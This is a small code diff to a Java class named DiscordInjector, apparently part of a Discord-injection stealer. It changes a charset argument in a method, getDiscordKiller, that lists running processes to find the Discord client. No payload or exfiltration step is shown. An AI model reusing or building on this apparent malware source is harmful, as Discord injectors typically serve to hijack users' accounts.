@@ -83,7 +83,7 @@ public class DiscordInjector {
 		_instance;
 		
 		private synchronized void getDiscordKiller() throws Exception {
-			Scanner scanner = new Scanner(Runtime.getRuntime().exec("tasklist.exe").getInputStream(), StandardCharsets.UTF_8).useDelimiter("\\A");
+			Scanner scanner = new Scanner(Runtime.getRuntime().exec("tasklist.exe").getInputStream(), String.valueOf(StandardCharsets.UTF_8)).useDelimiter("\\A");
 		    	String[] lines = new String(scanner.next()).split("\n");
 			for (String line : lines) {
 				if ((line).contains("iscord")) {
